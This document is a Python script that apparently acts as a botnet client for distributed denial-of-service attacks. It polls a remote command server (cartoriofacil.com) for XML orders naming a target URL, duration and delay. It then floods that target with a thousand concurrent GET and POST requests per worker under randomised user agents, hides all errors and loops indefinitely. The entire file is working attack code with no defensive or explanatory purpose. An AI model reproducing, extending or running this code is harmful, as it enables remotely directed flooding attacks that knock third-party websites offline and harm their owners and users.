import asyncio
import aiohttp
import time
import xml.etree.ElementTree as ET
import random
from fake_useragent import UserAgent

concurrent_requests = 1000
api_url = 'https://cartoriofacil.com/api/index.php'
ua = UserAgent()
NUM_THREADS = 2

async def test_connection():
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                pass
        except Exception:
            pass

async def get_instructions():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    xml_data = await response.text()
                    if xml_data:
                        root = ET.fromstring(xml_data)
                        url = root.find('url').text
                        time_val = int(root.find('time').text)
                        wait_val = int(root.find('wait').text)
                        return url, time_val, wait_val
                return None, None, None
    except Exception:
        return None, None, None

async def send_request(session, url, method='get'):
    try:
        headers = {
            "User-Agent": ua.random,
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": url,
        }
        payload = {'key': 'value'} if method.lower() == 'post' else None
        
        if method.lower() == 'post':
            async with session.post(url, headers=headers, data=payload, timeout=5) as response:
                await response.text()
        else:
            async with session.get(url, headers=headers, timeout=5) as response:
                await response.text()
    except Exception:
        pass

async def worker(thread_id, url, duration):
    connector = aiohttp.TCPConnector(
        limit=concurrent_requests,
        ssl=True,
        force_close=False,
        keepalive_timeout=30
    )
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=10)
    ) as session:
        start_time = time.time()
        while time.time() - start_time < duration:
            tasks = [send_request(session, url, random.choice(['get', 'post'])) 
                    for _ in range(concurrent_requests)]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.1)

async def send_requests_in_batch(url, duration):
    tasks = [worker(i, url, duration) for i in range(NUM_THREADS)]
    await asyncio.gather(*tasks)

async def main():
    await test_connection()
    
    while True:
        url, duration, wait = await get_instructions()
        if url and duration is not None and wait is not None:
            if wait > 0:
                await asyncio.sleep(wait)
            try:
                await send_requests_in_batch(url, duration)
            except Exception:
                pass
        else:
            sleep_time = random.randint(60, 180)
            await asyncio.sleep(sleep_time)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
